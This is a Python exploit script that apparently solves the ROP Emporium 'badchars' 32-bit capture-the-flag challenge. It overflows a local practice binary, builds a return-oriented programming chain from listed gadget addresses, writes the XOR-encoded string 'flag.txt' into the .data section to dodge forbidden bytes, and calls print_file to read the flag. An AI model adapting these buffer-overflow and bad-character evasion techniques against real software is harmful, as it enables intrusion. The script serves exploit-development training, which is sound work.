import re
import struct
from subprocess import PIPE, Popen

FILE_PATH = "./badchars32"

BADCHARS = b"xga."  # 120 103 97 46

JUNK = b"J" * 44
# rabin2 -i ./badchars32 | grep print_file | awk '{print $2}'
PRINT_FILE = struct.pack("<I", 0x080483D0)
# rabin2 -S ./badchars32 | grep -P "\-rw\- .data" | awk '{print $4}'
DATA_SECTIONS_1 = [struct.pack("<I", 0x0804A018 + i) for i in range(4)]
DATA_SECTIONS_2 = [struct.pack("<I", 0x0804A018 + 4 + i) for i in range(4)]

FILE_NAME_1 = b"dnce"  # flag ^ 0x02
FILE_NAME_2 = b",vzv"  # .txt ^ 0x02
ZERO = struct.pack("<I", 0x00000000)
ONE = struct.pack("<I", 0x00000001)
XOR_VAL = struct.pack("<I", 0x00000002)

# ROPgadget --binary ./badchars32 | grep " : pop esi ; pop edi ; pop ebp ; ret" | awk '{print $1}'
POP_ESI_EDI_EBP = struct.pack("<I", 0x080485B9)
# ROPgadget --binary ./badchars32 | grep " : mov dword ptr \[edi\], esi ; ret" | awk '{print $1}'
MOV_EDIP_ESI = struct.pack("<I", 0x0804854F)
# ROPgadget --binary ./badchars32 | grep " : xor byte ptr \[ebp\], bl ; ret"
XOR_EBPP_EBX = struct.pack("<I", 0x08048547)
# ROPgadget --binary ./badchars32 | grep " : pop ebx ; ret"
POP_EBX = struct.pack("<I", 0x0804839D)
# ROPgadget --binary ./badchars32 | grep " : pop ebp ; ret"
POP_EBP = struct.pack("<I", 0x080485BB)


payload = b""
payload += JUNK


for DATA_SECTIONS, FILE_NAME in zip(
    (DATA_SECTIONS_1, DATA_SECTIONS_2), (FILE_NAME_1, FILE_NAME_2)
):
    payload += POP_ESI_EDI_EBP + FILE_NAME + DATA_SECTIONS[0] + DATA_SECTIONS[0]
    payload += MOV_EDIP_ESI
    payload += POP_EBX + XOR_VAL
    payload += XOR_EBPP_EBX

    for i in range(1, 4):
        payload += POP_EBP + DATA_SECTIONS[i]
        payload += XOR_EBPP_EBX

payload += PRINT_FILE + ZERO + DATA_SECTIONS_1[0]


for c in BADCHARS:
    assert c not in payload


p = Popen(FILE_PATH, stdin=PIPE, stdout=PIPE, stderr=PIPE)
reply = p.communicate(payload)[0].decode()
flag = re.findall(r"ROPE{.+}", reply)[0]
print(flag)
